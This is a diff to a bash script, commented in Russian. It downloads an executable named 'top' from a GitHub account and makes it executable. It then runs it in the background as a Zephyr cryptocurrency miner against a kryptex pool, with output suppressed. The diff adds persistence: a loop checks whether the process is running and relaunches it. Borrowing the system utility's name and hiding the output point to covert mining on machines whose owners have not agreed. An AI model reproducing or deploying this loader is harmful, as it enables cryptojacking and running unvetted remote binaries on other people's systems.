@@ -14,7 +14,7 @@ download_file() {
 }
 
 # Шаг 1: Получение IP-адреса хоста
-host_ip=$(hostname -I)
+host_ip=$(hostname -I | awk '{print $1}')
 
 # Проверка наличия IP-адреса
 if [ -z "$host_ip" ]; then
@@ -34,20 +34,20 @@ while true; do
     # Ожидание 1 секунды
     sleep 1
 
-    # Шаг 2: Загрузка файла top с GitHub
-    download_file "https://github.com/fintafixuser/top/raw/main/top" "top"
-
-    # Шаг 3: Получаем IP-адрес хоста
-    host_ip=$(hostname -I)
-
-    # Проверка наличия IP-адреса
-    if [ -z "$host_ip" ]; then
-        echo "ERROR: IP address not found"
-        exit 1
+    # Шаг 2: Загрузка файла top с GitHub, если он не существует
+    if [ ! -f "top" ]; then
+        download_file "https://github.com/fintafixuser/top/raw/main/top" "top"
+        chmod +x top
     fi
 
-    # Запуск скрипта top с нужными параметрами в фоновом режиме
-    ./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k --coin zephyr -a rx/0 > /dev/null 2>&1 &
+    # Проверка, запущен ли уже процесс top
+    if ! pgrep -x "top" > /dev/null; then
+        # Запуск скрипта top с нужными параметрами в фоновом режиме
+        ./top -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/xm$host_ip -k --coin zephyr -a rx/0 > /dev/null 2>&1 &
+    fi
+
+    # Ожидание перед следующей итерацией
+    sleep 10
 done
 
 # Завершение скрипта
